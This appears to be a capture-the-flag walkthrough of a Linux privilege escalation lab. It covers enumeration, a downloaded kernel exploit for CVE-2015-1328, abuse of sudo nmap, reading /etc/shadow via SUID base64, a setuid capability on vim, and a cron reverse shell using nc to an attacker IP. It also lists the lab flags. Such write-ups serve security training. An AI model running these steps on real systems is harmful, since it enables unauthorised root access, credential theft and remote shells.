Exploiting enumeration, kernel vulnerabilities, SUID, cron jobs, PATH hijacking, and NFS misconfigurations using LinPEAS, GTFOBins, and ExploitDB.

By Ramyar Daneshgar

---

## **Task 1 & 2: Understanding Privilege Escalation**
Privilege escalation is the process of exploiting a system’s weaknesses to increase access privileges. Attackers use this to transition from a **low-privileged user** to **root access**, enabling them to modify critical files, extract sensitive data, and maintain persistence. From a security perspective, understanding these methods allows **defensive teams** to harden their systems by patching vulnerabilities, configuring permissions correctly, and monitoring for suspicious activity.

There are two primary forms of privilege escalation:
- **Vertical Privilege Escalation:** A standard user gains administrative or root access.
- **Horizontal Privilege Escalation:** A user accesses another user’s account at the same privilege level, often leading to lateral movement within a network.


---

## **Task 3: Enumeration – The First Step in Privilege Escalation**
Enumeration is the **foundation of privilege escalation** and involves gathering information about the system, including user accounts, kernel versions, running services, and available binaries. By identifying weak configurations and outdated software, an attacker can determine the best escalation method.

### **Step 1: Establish Access**
The first step is gaining access to the system. Using the provided credentials, I established an SSH connection:
```bash
ssh karen@<Target_IP>
```
This confirms that we are operating as a **low-privileged user** with restricted access to system resources.

### **Step 2: System Information Gathering**
To gain an overview of the system, I ran several commands to extract key details:

```bash
hostname
uname -a
cat /etc/issue
python --version
```
These commands revealed:
- **Hostname:** `wade7363`
- **Kernel Version:** `3.13.0-24-generic`
- **Operating System:** `Ubuntu 14.04 LTS`
- **Python Version:** `2.7.6`

The kernel version is of particular interest, as older versions often contain publicly disclosed vulnerabilities that can be exploited for privilege escalation.

### **Step 3: Checking User Privileges**
```bash
id
```
The output showed that `karen` has a standard user account with no special privileges. Understanding user roles is essential, as some users might belong to security-sensitive groups like `sudo` or `docker`, which can provide escalation paths.

### **Step 4: Network and Process Enumeration**
I examined running processes and network connections to identify potentially vulnerable services:
```bash
ps aux
netstat -tunlp
```
Running services can expose **network-facing attack vectors**, and some processes may be executing with elevated privileges, providing an opportunity for further exploitation.

---

## **Task 4: Automated Enumeration Using LinPEAS**
Instead of manually running multiple enumeration commands, I leveraged **LinPEAS**, an automated privilege escalation enumeration tool. LinPEAS scans for:
- **SUID binaries**
- **Misconfigured sudo permissions**
- **Writable files & directories**
- **Kernel vulnerabilities**
- **Network misconfigurations**

To transfer and execute LinPEAS:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
The results from LinPEAS provided a **comprehensive summary** of privilege escalation vectors, allowing me to select the most effective attack method.

---

## **Task 5: Kernel Exploitation**
The kernel version identified earlier (`3.13.0-24-generic`) is known to be vulnerable to **CVE-2015-1328**, an **OverlayFS race condition exploit**. Kernel exploits take advantage of vulnerabilities in the operating system's core, potentially granting root access.

### **Step 1: Identifying Kernel Vulnerabilities**
```bash
searchsploit 3.13.0-24
```
This confirmed that the system is vulnerable to **CVE-2015-1328**. ExploitDB provided a working exploit for this vulnerability.

### **Step 2: Downloading and Compiling the Exploit**
```bash
wget https://www.exploit-db.com/exploits/37292.c -O exploit.c
gcc exploit.c -o exploit
```
Most kernel exploits are written in **C**, requiring compilation with `gcc` before execution.

### **Step 3: Executing the Exploit**
```bash
./exploit
```
This successfully **elevated privileges to root**, allowing unrestricted access to the system.

### **Step 4: Capturing the Root Flag**
```bash
cat /root/flag1.txt
```
Flag retrieved: `THM-283928727299220`

---

## **Task 6: Privilege Escalation via Sudo Misconfigurations**
Sudo misconfigurations allow users to execute commands with **elevated privileges** without requiring a password. 

### **Step 1: Checking Sudo Permissions**
```bash
sudo -l
```
Output:
```
User karen may run the following commands:
(ALL) NOPASSWD: /bin/nano, /usr/bin/nmap, /usr/bin/vim
```
The presence of `nmap` is particularly interesting because older versions of **Nmap** include an interactive mode that can execute system commands.

### **Step 2: Exploiting Nmap for Root Shell**
```bash
sudo nmap --interactive
!sh
```
This spawned a **root shell**, effectively escalating privileges.

### **Step 3: Capturing the Flag**
```bash
cat /root/flag2.txt
```
Flag retrieved: `THM-402028394`

---

## **Task 7: Exploiting SUID Binaries**
Files with the **SUID (Set User ID) bit** execute with the file owner's privileges rather than the user’s.

### **Step 1: Finding SUID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null
```
A key binary found was `/usr/bin/base64`. Using **GTFOBins**, I identified an **exploit** to use base64 for privilege escalation.

### **Step 2: Exploiting Base64**
```bash
/usr/bin/base64 -d /etc/shadow
```
This revealed **hashed passwords**, which can be cracked using **John the Ripper**.

---

## **Task 8: Exploiting Linux Capabilities**
Linux capabilities allow fine-grained control over processes. I identified the `cap_setuid` capability, which enables privilege escalation.

### **Step 1: Finding Capabilities**
```bash
getcap -r / 2>/dev/null
```
Found `/home/ubuntu/view = cap_setuid+ep`.

### **Step 2: Exploiting Capabilities**
```bash
/home/ubuntu/view -c ':py3 import os; os.setuid(0); os.system("/bin/sh")'
```
This successfully escalated privileges to root.

---

## **Task 9: Cron Job Exploitation**
Cron jobs run scheduled tasks with specified privileges. If a **root-owned script** is writable, it can be modified for **arbitrary code execution**.

### **Step 1: Identifying Cron Jobs**
```bash
cat /etc/crontab
```
Identified `backup.sh`, running as **root**.

### **Step 2: Injecting a Reverse Shell**
```bash
echo "nc -e /bin/bash <attacker_ip> 4444" > /etc/cron.hourly/backup.sh
chmod +x /etc/cron.hourly/backup.sh
```
Upon execution, a **reverse shell** was obtained with root privileges.
